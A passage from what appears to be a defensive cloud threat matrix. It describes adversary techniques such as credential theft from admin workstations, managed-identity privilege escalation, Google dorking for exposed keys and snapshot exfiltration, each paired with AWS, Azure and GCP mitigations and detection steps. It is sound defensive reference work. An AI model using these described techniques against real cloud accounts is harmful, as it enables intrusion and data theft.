| Enable Azure Storage Logging | This is used to track how requests made to Azure Storage were authorized. Enabling logs provides visibility into whether a request was anonymous, made with an OAuth2.0 token, a shared key, or shared access signature (SAS). Full Azure Storage analytics logging details can be found at[**https://docs.microsoft.com/en-us/azure/storage/common/storage-analytics-logging?tabs=dotnet**](https://docs.microsoft.com/en-us/azure/storage/common/storage-analytics-logging?tabs=dotnet)**.** |


References


1.https://hackerone.com/reports/399166. Accessed 02/12/2020


2.techcommunity.microsoft.com/t5/azure-sentinel/hunting-for-capital-one-breach-ttps-in-aws-logs-using-azure/ba-p/1014258#. Accessed Feb. 21, 2020


3.<https://github.com/nccgroup/ScoutSuite>. Accessed July 27, 2020.


4.<https://github.com/toniblyx/prowler>. Accessed July 27, 2020.


5.<https://d0.awsstatic.com/whitepapers/compliance/AWS_CIS_Foundations_Benchmark.pdf>. Accessed July 27, 2020.


6.<https://github.com/clario-tech/s3-inspector>. Accessed July 27, 2020.


7.<https://blog.appsecco.com/getting-shell-and-data-access-in-aws-by-chaining-vulnerabilities-7630fa57c7ed>. Accessed July 27, 2020.


8.<https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html>. Accessed July 31, 2020.


9.<https://docs.microsoft.com/en-us/azure/storage/blobs/security-recommendations>. Accessed August 3, 2020.


10.<https://docs.aws.amazon.com/AmazonS3/latest/dev/security-best-practices.html>. Accessed August 3, 2020.


11.<https://docs.microsoft.com/en-us/azure/storage/common/storage-analytics-logging?tabs=dotnet>. Accessed August 3, 2020.


# Sensitive Information Exposed on A Public Platform(version 1.0)


**Cloud Service Label: IaaS, PaaS, SaaS**


Description


Adversaries may be able to exploit information that is found exposed online. This type of information could include emails, usernames, passwords, keys, and any information considered sensitive that could be used to facilitate initial or prolonged access. Instances of this could include credentials uploaded to GitHub, information found on a server, or in numerous other places. Adversaries may be able to exploit sensitive information that is exposed. For this reason, configurations should be made to lock down any and all sensitive information and be vigilant when uploading information to publicly accessible resources. This can lead to initial access, privilege escalation, discovery, and collection.


Examples




| **Name** | **Description** |
| --- | --- |
| AWS Data Exposed on GitHub | An AWS engineer committed a gigabyte of data to a GitHub repository. This data included information such as access keys, authentication keys, API keys, and information listed as confidential. This data was a large amount and was accessible for five hours. |
| Google Dorking | Google Dorking is a technique utilizing specially crafted search queries to identify exposed credentials, vulnerable files, and system information on publicly hosted platform. Searching keywords like “aws”, “amazon”, “azure”, “microsoft cloud” will return results related to these cloud platforms. |


Mitigations




| **Mitigation** | **Description** |
| --- | --- |
| Sanitize Data | Always make sure to sanitize data before uploading to publicly accessible resources like the tool git-secrets. Git-secrets is a tool from AWSLabs’ GitHub meant to prevent a user from committing passwords and other sensitive information to a git repo. It is also used to scan a repository for already exposed credentials. |
| DLP Solutions | Data loss prevention software can prevent sensitive data from being exposed on a public platform by monitoring, detecting, and blocking an organization’s data. |


Detection


Monitor posts to public repositories for any sensitive information that can be exploited by an adversary. There are Cloud Access Security Brokers (CASB) that can be used to scan public repositories looking for an organization’s sensitive material, after the fact.


References


1.[Security Boulevard. (Jan 27, 2020). AWS Data Exposed on GitHub. Accessed June 10, 2020.](https://securityboulevard.com/2020/01/aws-data-exposed-on-github/)


2.<https://github.com/awslabs/git-secrets>. Accessed July 15, 2020.


3.<https://www.exploit-db.com/google-hacking-database>. Accessed July 15, 2020.


# Managed Identities/Service Principals(version 1.0)


**Cloud Service Label: IaaS, PaaS**


Description


Both Azure and AWS employ authentication/authorization accounts that enable user access paradigms to be applied to cloud applications and resources. In Azure these “service principals” are called Managed Identities and can be assigned to VM’s and other Azure resources rather than embedding access credentials elsewhere within the resource that could be stolen. These service principals can be leveraged by any one with local command privileges to access cloud resources that the service principal object may have rights to.


In Azure, Automation accounts are required to automate admin tasks and are automatically assigned contributor privileges to the subscription. Contributor access on the subscription inherently gives you contributor rights on all of the virtual machines in a subscription which in turn grants you SYSTEM on Windows and root on Linux VMs.


Examples




| **Name** | **Tactic** | **Description** |
| --- | --- | --- |
| NetSPI | Defense Evasion | Users allowed to create work books inside an Azure automation account can run code with the permissions of the automation account which often has contributor rights to the subscription. |
| NetSPI | Escalation | NetSPI proof of concept that allows any user with access to Azure VM to retrieve and use tokens from an assigned Service Principal to escalate privileges. |
| NetSPI | Persistence | NetSPI proof of concept using automation account credentials to maintain persistence on running VM’s (even if initial credentials are replaced/revoked?) |


Mitigations




| **Mitigation** | | **Description** |
| --- | --- | --- |
| Least Privilege | | All access given to users in the cloud environment should be assigned by the necessary privileges needed for team members to complete their job responsibilities.Ensure that temporary access tokens are issued rather than permanent credentials, especially when access is being granted to entities outside of the internal security boundary. |
|  | AWS | To implement least privilege in an AWS environment IAM policies will be used. This gives the ability to allow users to perform list, read, write, permissions management, or tagging actions. AWS suggests utilizing*last accessed information*and A*WS CloudTrail event history*to get a better understanding of privileges that might be needed or reduced based on a specific role. Full details can be found at**https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege.** |
|  | Azure | To implement least privilege in an Azure environment Azure Active Directory roles will be used. Azure outlines different tasks and the least privileged role that are suggested to be associated with the task. Those details can be found at:**https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/roles-delegate-by-task.**To learn how to assign specific roles it can be done via the Azure Active Directory Portal. Instructions on how to assign roles can be found here:**https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-manage-roles-portal.** |
|  | GCP | To implement least privilege in GCP it is recommended to use predefined roles (which allow for granular access permissions) instead of primitive roles (roles/owner, roles/editor, and roles/viewer). Full details on the difference between types of roles can be found here:**https://cloud.google.com/iam/docs/understanding-roles.**To assign these roles IAM service accounts are used and complete details can be found at:**https://cloud.google.com/iam/docs/using-iam-securely#least\_privilege.** |


Detection




| **Detection** | **Description** |
| --- | --- |
| Create Log Metric Filters and Alarms for AWS | To create a metric filter and alarm: 1.Create a metric filter that checks for IAM policy changes and the*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter and SNS topic created in steps 1 and 2 respectively |
| Monitor Activity in AWS Account | Various services in AWS offer logging features that allow for detection capabilities. These include CloudFront, CloudTrail, CloudWatch, Config, and S3. |
| Monitor for Suspicious Activity in Azure | Azure AD can generate anomaly reports than can be run on a daily basis. Azure AD Identity Protection show current risks in its dashboard and provides daily email summary notifications. Policies can also be configured to alert to specific issues. |
| Create Log Metric Filters and Alarms for CloudTrail | To create a metric filter and alarm: 1.Create a filter that checks for CloudTrail changes and the specific*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic that the alarm will notify 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter from step 1 and SNS topic in step 2 |
| Create Activity Log Alerts in Azure | To create log activity alerts for deletion in the Azure Console: 1.Navigate to*Monitor’ / ‘Alerts* 2.Select*Manage alert rules* 3.Click on the Alert*Name*where Condition contains*operationName equals Microsoft.Network/networkSecurityGroups/securityRules/delete* 4.Hover a mouse over*Condition*to ensure it is set to*Whenever the Administrative Activity Log “Delete Security Rule (networkSecurityGroups/securityRules)” has “any” level with “any” status and event is initiated by “any*” |
| Create, View, and Manage Activity Alerts in Azure Monitor | To create a log alert in the Azure portal: 1.Select**Monitor -> Alerts** 2.Select**New alert rule**of the**Alerts**window 3.Provide information in**Define alert condition** 4.Provide details in**Define alert details** 5.Specify action group for new alert rule under**Action group**, or create a new action group with +**New group** 6.Select**Yes**for the**Enable rule upon creation**option 7.Select**Create alert rule** To view and manage alerts: 1.Select**Monitor -> Alerts -> Manage alert rules** 2.Select the rule you want to modify and double-click to edit the rule options 3.Click**Save** |
| Azure Resource Manager Templates | Azure Resource Manager templates in the format of JSON files that can be used to configure metric alerts in Azure Monitor. These templates can be used for simple static and dynamic threshold metric alerts, availability tests, and monitoring multiple resources. |
| Enable CloudTrail across all regions in AWS | To enable CloudTrail across all regions: 1.Sign into the AWS Management Console and open the CloudTrail console 2.Click on*Trails* 3.Set necessary Trails to All option in the I column 4.Click on a trail via the link*Name*column 5.Set*Logging*to*ON* 6.Set*Apply trail to all regions*to*Yes* |
| Configure log profile to capture activity logs for all regions in Azure | To set up activity logs for all regions: 1.Navigate to Azure console 2.Go to*Activity log* 3.Select*Export* 4.Select*Subscription* 5.Check*Select all*in*Regions* 6.Select*Save* |


References


1.<https://blog.netspi.com/azure-privilege-escalation-using-managed-identities/>. Accessed June 1, 2020


# Stealing Valid Credentials from Local Machines(version 1.0)


**Cloud Service Label: IaaS**


Description


Adversaries may steal the credentials of cloud administrators using well-known endpoint credential harvesting techniques. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available cloud services, such as cloud storage services. Compromised credentials may also grant an adversary increased privilege to specific cloud systems or resources.


It is common for adversaries to utilize stolen private keys, to legitimately connect to remote IaaS environments via[Remote Services](https://attack.mitre.org/techniques/T1021). AWS routinely assigns remote keys to every new VM created. These keys are usually downloaded and stored on the local box of the user who is performing the VM creation task. A local exploit of this user’s workstation now also compromises access to whatever VM’s this user has created.


Local web browsers of cloud admin console users cache access tokens that enable quick reconnection if a browser window is accidentally closed. However these tokens may also be stolen from local machines to grant cloud console access to adversaries who have a presence on the local workstation of that user.


The overlap of local workstation access, credentials, and permissions across a network of local workstations and Cloud systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., user plane to control plane) to bypass access controls set within the enterprise.


Examples




| **Name** | **Description** |
| --- | --- |
|  |  |


Mitigations




| **Mitigation** | | **Description** |
| --- | --- | --- |
| Audit | | Routinely audit source code, application configuration files, open repositories, and public cloud storage for insecure use and storage of credentials. |
|  | AWS | To perform an audit via AWS it is suggested to review information such as account details (credentials, users, groups, roles, etc), mobile applications, EC2 configurations, policies, and account activity. How to audit these different factors can be found in detail at:**https://docs.aws.amazon.com/general/latest/gr/aws-security-audit-guide.html.** |
|  | Azure | To perform an audit via Azure an administrator can review the audit logs that are recorded under Azure’s monitoring for active directory. The audit logs allow for filtering, as well as looking at users, groups, and enterprise specific information. Full details on how to access this information can be found at:**https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/concept-audit-logs.** |
|  | GCP | To perform an audit via GCP the logs can be reviewed. GCP breaks this down into three categories; admin activity, data access, and system events. The audit logs can be viewed a few different ways- the console, API, or gcloud. Full details on how to view these logs, how to export, and for how to configure the retention period can be found here:**https://cloud.google.com/logging/docs/audit.** |
| Consider Using Cloud Shells | | Azure offers admins a command line interface directly from the web console that already has been authenticated. This potentially eliminates the need for admins to download cloud credentials locally to their workstation. |
| Filter Network Traffic | | Cloud service providers support IP-based restrictions when accessing cloud resources. Consider using IP whitelisting on cloud-based systems along with user account management to ensure that data access is restricted not only to valid users but only from expected IP ranges to mitigate the use of stolen credentials to access data. |
|  | AWS | An AWS environment can be configured with network ACLs (access control lists) to allow or deny inbound and outbound traffic. This can be accomplished by accessing Amazon VPC and navigating to either inbound or outbound rules depending on the rule the user wishes to add and they can be added, removed, or edited from that panel. Full details about ACLs and how to add rules in AWS can be found here:**https://docs.aws.amazon.com/vpc/latest/userguide/vpc-network-acls.html.** |
|  | Azure | In Azure storage resources can be tied exclusively to a particular virtual network reducing the chances that it can be accessed externally or from other cloud assets. This can be done multiple ways including the Azure Portal, Azure PowerShell, and Azure CLI (Command Line Interface). Depending on the method used to implement this the procedure can vary, but will include the need to create a security group, create a network security group, associate that network security group with a specific subnet and then create security rules that are associated to the inbound and outbound rules for that subnet. Full details on how to configure this utilizing the various methods can be found below: Azure Portal:**https://docs.microsoft.com/en-us/azure/virtual-network/tutorial-filter-network-traffic** Azure PowerShell:**https://docs.microsoft.com/en-us/azure/virtual-network/tutorial-filter-network-traffic-powershell** Azure CLI:**https://docs.microsoft.com/en-us/azure/virtual-network/tutorial-filter-network-traffic-cli** |
| Honey Tokens | | Create accounts credentials with no inherent rights that will be noticed in CloudTrail or Monitor and indicate malicious activity. |
| Key Policies | | SSH keys should be updated periodically and properly secured. In cloud environments, consider rotating access keys within a certain number of days for reducing the effectiveness of stolen credentials. |
| [Multi-factor Authentication](https://attack.mitre.org/mitigations/M1032) | | Use multi-factor authentication for user and privileged accounts. Do not manage Cloud portals from machines that perform user email and web browsing tasks. All users should be required to utilize two factor authentication. |
|  | AWS | This can be enforced by first creating a policy that would prohibit actions except those that allow a user to change their password or manage 2FA, then attaching a policy to a group that includes all user accounts where they can be allowed all access if they sign in with 2FA. Once these actions are completed it should be tested to verify the access is given correctly. To see full details on how to complete this view AWS documentation at:**https://docs.aws.amazon.com/IAM/latest/UserGuide/tutorial\_users-self-manage-mfa-and-creds.html.** |
|  | Azure | This can be done by creating a MFA registration policy. It can than be assigned to all users (with the ability to exclude some if need be, but is not recommended). Make sure once the policy is created and added to users that it is then being enforced, once enforced it should be tested for verification. To see full details on how to complete this view Azure documentation at:**https://docs.microsoft.com/en-us/azure/active-directory/identity-protection/howto-identity-protection-configure-mfa-policy.** |
|  | GCP | This can be done by first enabling it on the current account being used by admin to assign the roles, then enable two factor on an instance by instance or project by project basis, then assigning the requirements based on IAM roles and applying it to all users. To see full details on how to complete this view Azure documentation at:**https://cloud.google.com/compute/docs/oslogin/setup-two-factor-authentication.** |
| [Privileged Account Management](https://attack.mitre.org/mitigations/M1026) | | For IaaS Windows server VM’s, audit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account. Use RBAC to limit the impact anyone account can have on your cloud assets. General “GOD” level accounts that have access to all cloud resources should never be used for daily administration within the cloud. Rather use accounts that have been delegated admin access to certain resources. In Azure for example, using an account with the owner role at the subscription level for every day tasks is a risky proposition. Once the infrastructure has been created and refined these credentials are no longer required for most admin tasks. Limit credential overlap across systems to prevent access if account credentials are obtained. |
|  | AWS | To manage the access that privileged accounts have on the AWS cloud system to only allow administrators to perform administrative tasks on such accounts can be accomplished utilizing limited IAM administrator accounts. To configure this the administrator would have two accounts; one would have administrative rights and no basic access while the other account has basic access with no administrative rights. To limit the administrative account the IAM limited administrator would be used. This is done by creating a policy that gives a user admin rights, but disallows the other actions using the AWS command line interface. This is outlined at:[**https://aws.amazon.com/blogs/security/how-to-create-a-limited-iam-administrator-by-using-managed-policies/**](https://aws.amazon.com/blogs/security/how-to-create-a-limited-iam-administrator-by-using-managed-policies/)**.** |
|  | Azure | To manage the access that privilege accounts have on the Azure cloud system to only allow administrators to perform administrative tasks on such accounts can be accomplished utilizing limited IAM administrator accounts. To configure this the administrator would have two accounts; one would have administrative rights and no basic access while the other account has basic access with no administrative rights. To limit the administrative account the specific administrative needs can be picked from a number of options available (Azure DevOps Administrator, Billing Administrator, Cloud Application Administrator, etc.) These different options can be edited to fit the needs and limit the basic access. This is outlined at:[**https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles**](https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles)**.** |
|  | GCP | To manage the access that privilege accounts have on the Azure cloud system to only allow administrators to perform administrative tasks on such accounts can be accomplished utilizing limited IAM administrator accounts. To configure this the administrator would have two accounts; one would have administrative rights and no basic access while the other account has basic access with no administrative rights. To limit the administrative account pre-defined administrator accounts can be used (mobile admin, Google voice admin, help desk admin, etc.). These accounts can be used with their pre-defined settings, or modified depending on specific use cases. These can limit access to basic functionality needed. This is outlined at:**https://support.google.com/a/answer/2405986?hl=en.** |
| [User Account Management](https://attack.mitre.org/mitigations/M1018) | | Ensure users and user groups have appropriate permissions for their roles through Identity and Access Management (IAM) controls. Configure user permissions, groups, and roles for access to cloud-based systems. Implement strict IAM controls to prevent access to systems except for the applications, users, and services that require access. Consider using temporary credentials that are only good for a certain period of time in cloud environments to reduce the effectiveness of compromised accounts. |
| Use a Bastion Host | | Accessing IaaS resources for administration is best done from within the cloud by means of a bastion server that preferably resides in the same VPC/Virtual network as the IaaS assets. By restricting all external network traffic except this bastion host from accessing privileged ports on IaaS assets, the chance of damage done by exploited accounts is diminished. |


Detection




| **Detection** | | **Description** |
| --- | --- | --- |
| Monitoring | | Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access). |
|  | AWS | Various services in AWS offer logging features that allow for detection capabilities. These include CloudFront, CloudTrail, CloudWatch, Config, and S3. To create a metric filter and alarm: 1.Create a metric filter that checks for IAM policy changes and the*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter and SNS topic created in steps 1 and 2 respectively |
|  | Azure | Azure AD can generate anomaly reports than can be run on a daily basis. Azure AD Identity Protection show current risks in its dashboard and provides daily email summary notifications. Policies can also be configured to alert to specific issues. To create a log alert in the Azure portal: 1.Select**Monitor -> Alerts** 2.Select**New alert rule**of the**Alerts**window 3.Provide information in**Define alert condition** 4.Provide details in**Define alert details** 5.Specify action group for new alert rule under**Action group**, or create a new action group with +**New group** 6.Select**Yes**for the**Enable rule upon creation**option 7.Select**Create alert rule** To view and manage alerts: 1.Select**Monitor -> Alerts -> Manage alert rules** 2.Select the rule you want to modify and double-click to edit the rule options 3.Click**Save** |
| Auditing | | Perform regular audits of cloud accounts to detect accounts that may have been created by an adversary for persistence. Checks on these accounts could also include whether default accounts such as Guest have been activated. These audits should also include checks on any appliances and applications for default credentials or SSH keys, and if any are discovered, they should be updated immediately. |
|  | AWS | To perform an audit via AWS it is suggested to review information such as account details (credentials, users, groups, roles, etc), mobile applications, EC2 configurations, policies, and account activity. How to audit these different factors can be found in detail at:[**https://docs.aws.amazon.com/general/latest/gr/aws-security-audit-guide.html**](https://docs.aws.amazon.com/general/latest/gr/aws-security-audit-guide.html)**.** |
|  | Azure | To perform an audit via Azure an administrator can review the audit logs that are recorded under Azure’s monitoring for active directory. The audit logs allow for filtering, as well as looking at users, groups, and enterprise specific information. Full details on how to access this information can be found at:[**https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/concept-audit-logs**](https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/concept-audit-logs)**.** |
|  | GCP | To perform an audit via GCP the logs can be reviewed. GCP breaks this down into three categories; admin activity, data access, and system events. The audit logs can be viewed a few different ways- the console, API, or gcloud. Full details on how to view these logs, how to export, and for how to configure the retention period can be found here:[**https://cloud.google.com/logging/docs/audit**](https://cloud.google.com/logging/docs/audit)**.** |


References


1.<https://cloud.google.com/logging/docs/audit>. Accessed July 30, 2020


2.<https://docs.aws.amazon.com/general/latest/gr/aws-security-audit-guide.html>. Accessed July 30, 2020


3.<https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/concept-audit-logs>. Accessed July 30, 2020


# System (VM) Information Discovery(version 1.1)


**Cloud Service Label: IaaS**


Description


An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.


Examples




| **Name** | **Description** |
| --- | --- |
| Windows | Example commands and utilities that obtain this information include ver, Systeminfo, and dir within cmd for identifying information based on present files and directories. |
| Application Discovery Service (AWS) | In Amazon Web Services (AWS), the Application Discovery Service may be used by an adversary to identify servers, virtual machines, software, and software dependencies running. |
| Google Cloud Platform (GCP) | GET /v1beta1/{{parent=organizations/}}/assets or POST/v1beta1/{{parent=organizations/}}/assets:runDiscovery may be used to list an organizations cloud assets, or perform asset discovery on a cloud environment. |
| API Request (Azure) | In Azure, the API request GET[https://management.azure.com/subscriptions/{{subscriptionId}}/resourceGroups/{{resourceGroupName}}/providers/Microsoft.Compute/virtualMachines/{{vmName}}?api-version=2019-03-01](https://management.azure.com/subscriptions/%7b%7bsubscriptionId%7d%7d/resourceGroups/%7b%7bresourceGroupName%7d%7d/providers/Microsoft.Compute/virtualMachines/%7b%7bvmName%7d%7d?api-version=2019-03-01) may be used to retrieve information about the model or instance view of a virtual machine. |
| Co-residence identification and Information Leakage detailed in academic papers | Specific information in hypervisors like privileged VM IP addresses and access keys used by machine admins can theoretically be inferred by occupying a VM on the same physical host as the target and performing clever cache queries to infer Information that normally would be protected by Cloud identity and access solutions. |


Mitigations




| **Mitigation** | **Description** |
| --- | --- |
|  | This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of cloud system features. |


Detection


Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through[PowerShell](https://attack.mitre.org/techniques/T1086). And the CLI in cloud-based systems, native logging can be used to identify access to certain APIs and dashboards that may contain system information. Depending on how the environment is used, that data alone may not be useful due to benign use during normal operations.


References


1.[Amazon. (n.d.). What Is AWS Application Discovery Service?. Retrieved October 8, 2019.](https://docs.aws.amazon.com/en_pv/application-discovery/latest/userguide/what-is-appdiscovery.html)


2.[Google. (2019, October 3). Quickstart: Using the dashboard. Retrieved October 8, 2019.](https://cloud.google.com/security-command-center/docs/quickstart-scc-dashboard)


3.[Microsoft. (2019, March 1). Virtual Machines - Get. Retrieved October 8, 2019.](https://docs.microsoft.com/en-us/rest/api/compute/virtualmachines/get)


4.<https://cseweb.ucsd.edu/~savage/papers/CCS09.pdf>. Accessed July 2, 2020.


5.Wait a minute! A fast, Cross-VM attack on AES Gorka Irazoqui, Mehmet Sinan Inci, Thomas Eisenbarth, and Berk Sunar Worcester Polytechnic Institute, Worcester, MA, USA – Accessed August 6,2020


# System Network Connections Discovery(version 1.0)


**Cloud Service Label: IaaS, PaaS**


Description


Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network or by sniffing network traffic that the machine can see.


An adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers have different ways in which their virtual networks operate, but the basic concepts are the same.


Examples




| **Name** | **Description** |
| --- | --- |
|  |  |


Mitigations




| **Mitigation** | **Description** |
| --- | --- |
|  | This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features. |


Detection


Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through PowerShell or the CLI.


References


# Tagging Falsely(version 1.0)


**Cloud Service Label: IaaS, PaaS**


Description


AWS and Azure allow cloud users to tag resources with arbitrary labels ostensibly for accounting and management purposes. It is often a good practice to use this tagging information in detection engines and in making automated security decisions. If an adversary is able to discern the tagging protocol, he can alter tags for newly created services to potentially avoid detection or to circumvent security mitigations.


Examples




| **Name** | **Description** |
| --- | --- |
|  |  |


Mitigations




| **Mitigation** | **Description** |
| --- | --- |
| Limit Rights to Add or Modify Tags | Azure does not currently allow you to limit tagging of a resource you already have contributor or owner rights to. However changes to the tags will be reflected in API logs in both AWS and Azure. |


Detection


Tag results are recorded in Cloud API logs. Multiple concurrent tag changes that are not part of some CI/CD process are likely rare and should be viewed with suspicion


References


1.https://social.msdn.microsoft.com/Forums/azure/en-US/580ce000-e413-455d-a4b2-9a512e6da018/restrict-tag-value-modification?forum=WAVirtualMachinesforWindows. Accessed June 12, 2020


# Transfer Data to Cloud Account in Same CSP(version 1.0)


**Cloud Service Label: IaaS, PaaS**


Description


An adversary may exfiltrate data by transferring the data, including backups or snapshots of cloud environments, to another cloud account they control on the same service to avoid typical file transfers/downloads and network-based exfiltration detection.


A defender who is monitoring for large transfers external to the cloud environment through normal file transfers or over command and control channels may not be watching for data transfers to another account within the same cloud provider or even to another VPC illicitly created within the same account. Such transfers may utilize existing cloud provider APIs and the internal address space of the cloud provider to blend into normal traffic or avoid data transfers over external network interfaces.


Incidents have been observed where adversaries have created backups of cloud instances and transferred them to separate accounts.


Examples




| **Name** | **Description** |
| --- | --- |
| Justice Department Indictment | This indictment outlines how adversaries created backups of a cloud-based system utilizing the cloud providers technology. Adversaries then used their own accounts on the same cloud service to move the backups to. This lead to them effectively stealing the data. |


Mitigations




| **Mitigation** | | **Description** |
| --- | --- | --- |
| Filter Network Traffic | | Cloud service providers support IP-based restrictions when accessing cloud resources. Consider using IP whitelisting along with user account management to ensure that data access is restricted not only to valid users, but only from expected IP ranges to mitigate the use of stolen credentials to access data. |
|  | AWS | An AWS environment can be configured with network ACLs (access control lists) to allow or deny inbound and outbound traffic. This can be accomplished by accessing Amazon VPC and navigating to either inbound or outbound rules depending on the rule the user wishes to add and they can be added, removed, or edited from that panel. Full details about ACLs and how to add rules in AWS can be found here:**https://docs.aws.amazon.com/vpc/latest/userguide/vpc-network-acls.html.** |
|  | Azure | In Azure storage resources can be tied exclusively to a particular virtual network reducing the chances that it can be accessed externally or from other cloud assets. This can be done multiple ways including the Azure Portal, Azure PowerShell, and Azure CLI (Command Line Interface). Depending on the method used to implement this the procedure can vary, but will include the need to create a security group, create a network security group, associate that network security group with a specific subnet and then create security rules that are associated to the inbound and outbound rules for that subnet. Full details on how to configure this utilizing the various methods can be found below: Azure Portal:**https://docs.microsoft.com/en-us/azure/virtual-network/tutorial-filter-network-traffic** Azure PowerShell:**https://docs.microsoft.com/en-us/azure/virtual-network/tutorial-filter-network-traffic-powershell** Azure CLI:**https://docs.microsoft.com/en-us/azure/virtual-network/tutorial-filter-network-traffic-cli** |
| Password Policies | | Consider rotating access keys within a certain number of days to reduce the effectiveness of stolen credentials. |
|  | AWS | Good password practices can be enforced in AWS via the console, AWS CLI, and AWS API. These configurations are for IAM accounts only and have a range of different characteristics that can be enforced. For instance minimum password length, require a range of characters (lowercase, uppercase, number, and non alphanumeric ), allow users to change their own password, password expiration, prevent password reuse, and require administrator reset after password expiration. All details on how to configure these enforcement policies with all three management systems can be found here:**https://docs.aws.amazon.com/IAM/latest/UserGuide/id\_credentials\_passwords\_account-policy.html.** |
|  | Azure | Good password practices can be enforced in Azure only with managed domains created using the resource manager deployment. By default these accounts have some policies enforced including amount of lockout duration, allowed number of logon attempts,Reset failed logon attempts count after 30 minutes, and lifetime of password. Other policies that can be changed are minimum password length and the ability to enforce the concept of ‘passwords must meet complexity requirements’. These configurations can be accomplished by accessing the Active Directory Administrative Center under administrative tools, then editing the rules under the settings for the Password Settings Container. Full details on how to accomplish this can be found here:**https://docs.microsoft.com/en-us/azure/active-directory-domain-services/password-policy.** |
| Least Privilege | | All access given to users in the cloud environment should be assigned by the necessary privileges needed for team members to complete their job responsibilities.Ensure that temporary access tokens are issued rather than permanent credentials, especially when access is being granted to entities outside of the internal security boundary. |
|  | AWS | To implement least privilege in an AWS environment IAM policies will be used. This gives the ability to allow users to perform list, read, write, permissions management, or tagging actions. AWS suggests utilizing*last accessed information*and A*WS CloudTrail event history*to get a better understanding of privileges that might be needed or reduced based on a specific role. Full details can be found at**https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege.** |
|  | Azure | To implement least privilege in an Azure environment Azure Active Directory roles will be used. Azure outlines different tasks and the least privileged role that are suggested to be associated with the task. Those details can be found at:**https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/roles-delegate-by-task.**To learn how to assign specific roles it can be done via the Azure Active Directory Portal. Instructions on how to assign roles can be found here:**https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-manage-roles-portal.** |
|  | GCP | To implement least privilege in GCP it is recommended to use predefined roles (which allow for granular access permissions) instead of primitive roles (roles/owner, roles/editor, and roles/viewer). Full details on the difference between types of roles can be found here:**https://cloud.google.com/iam/docs/understanding-roles.**To assign these roles IAM service accounts are used and complete details can be found at:**https://cloud.google.com/iam/docs/using-iam-securely#least\_privilege.** |


Detection




| **Detection** | **Description** |
| --- | --- |
| Create Log Metric Filters and Alarms for AWS | To create a metric filter and alarm: 1.Create a metric filter that checks for IAM policy changes and the*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter and SNS topic created in steps 1 and 2 respectively |
| Monitor Activity in AWS Account | Various services in AWS offer logging features that allow for detection capabilities. These include CloudFront, CloudTrail, CloudWatch, Config, and S3. |
| Monitor for Suspicious Activity in Azure | Azure AD can generate anomaly reports than can be run on a daily basis. Azure AD Identity Protection show current risks in its dashboard and provides daily email summary notifications. Policies can also be configured to alert to specific issues. |
| Create Log Metric Filters and Alarms for CloudTrail | To create a metric filter and alarm: 1.Create a filter that checks for CloudTrail changes and the specific*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic that the alarm will notify 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter from step 1 and SNS topic in step 2 |
| Create Activity Log Alerts in Azure | To create log activity alerts for deletion in the Azure Console: 1.Navigate to*Monitor’ / ‘Alerts* 2.Select*Manage alert rules* 3.Click on the Alert*Name*where Condition contains*operationName equals Microsoft.Network/networkSecurityGroups/securityRules/delete* 4.Hover a mouse over*Condition*to ensure it is set to*Whenever the Administrative Activity Log “Delete Security Rule (networkSecurityGroups/securityRules)” has “any” level with “any” status and event is initiated by “any*” |
| Create, View, and Manage Activity Alerts in Azure Monitor | To create a log alert in the Azure portal: 1.Select**Monitor -> Alerts** 2.Select**New alert rule**of the**Alerts**window 3.Provide information in**Define alert condition** 4.Provide details in**Define alert details** 5.Specify action group for new alert rule under**Action group**, or create a new action group with +**New group** 6.Select**Yes**for the**Enable rule upon creation**option 7.Select**Create alert rule** To view and manage alerts: 1.Select**Monitor -> Alerts -> Manage alert rules** 2.Select the rule you want to modify and double-click to edit the rule options 3.Click**Save** |
| Azure Resource Manager Templates | Azure Resource Manager templates in the format of JSON files that can be used to configure metric alerts in Azure Monitor. These templates can be used for simple static and dynamic threshold metric alerts, availability tests, and monitoring multiple resources. |
